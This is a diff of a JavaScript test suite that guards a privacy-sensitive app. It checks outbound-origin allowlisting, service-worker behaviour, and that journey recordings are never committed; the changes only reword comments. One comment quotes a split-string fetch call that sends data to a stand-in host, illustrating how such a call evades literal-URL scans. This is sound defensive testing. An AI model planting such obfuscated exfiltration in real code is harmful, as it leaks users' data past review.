@@ -43,7 +43,7 @@ s.test('no outbound origin exists outside the declared probe allowlist', () => {
     assert.ok(ALLOWED_ORIGINS.some(o => url.startsWith(o)),
               `undeclared outbound origin: ${entry}`);
   }
-  assert.ok(found.size > 0, 'the allowlist check actually inspected something');
+  assert.ok(found.size > 0, 'the allowlist check inspected something');
 });
 
 // A scan for forbidden URL literals passes `fetch('https:' + '//elsewhere/?d=' + data)` and
@@ -211,7 +211,7 @@ s.test('the service worker never intercepts a probe', () => {
   const sw = read('sw.js');
   assert.match(sw, /url\.origin !== self\.location\.origin/, 'cross-origin requests pass through untouched');
   assert.match(sw, /e\.request\.method !== 'GET'/, 'and so does anything that is not a GET');
-  // Matches the call rather than the word, which appears in a comment in sw.js.
+  // Matches the call, since the word alone appears in a comment in sw.js.
   assert.ok(!/\bskipWaiting\s*\(/.test(sw), 'a new version never takes over a tab mid-session');
 });
 
@@ -223,7 +223,7 @@ s.test('there are no runtime dependencies to trust', () => {
 });
 
 // A recorded journey carries a home address, a workplace and a daily timetable, so .dev is
-// excluded as a directory rather than by filename.
+// excluded as a directory.
 s.test('nothing under .dev is tracked, and the directory is ignored outright', () => {
   const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
     .split('\n').filter(Boolean);
@@ -235,8 +235,7 @@ s.test('nothing under .dev is tracked, and the directory is ignored outright', (
     .split('\n').map(l => l.trim());
   assert.ok(rules.includes('.dev/'), '.gitignore ignores the directory as a whole');
 
-  // Checked through git rather than by reading the file; a path that does not exist is still
-  // answered by the ignore rules.
+  // Checked through git, which answers the ignore rules for a path that does not exist.
   const check = execFileSync('git', ['check-ignore', '-v', '.dev/anything/at/all.json'],
                              {cwd: root, encoding: 'utf8'});
   assert.match(check, /\.dev\//, `git ignores anything under it: ${check.trim()}`);
@@ -259,8 +258,8 @@ s.test('every committed fixture has been through the anonymiser', async () => {
 s.test('no journey recording is tracked anywhere in the tree', () => {
   const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
     .split('\n').filter(Boolean);
-  // Matched on shape rather than extension: a recording saved as .txt or pasted into a note
-  // carries the same format marker.
+  // Matched on shape: a recording saved as .txt or pasted into a note carries the same
+  // format marker.
   const binary = /\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|zip|pdf)$/;
   for (const f of tracked) {
     if (f === 'package.json' || f === 'package-lock.json' || binary.test(f)) continue;
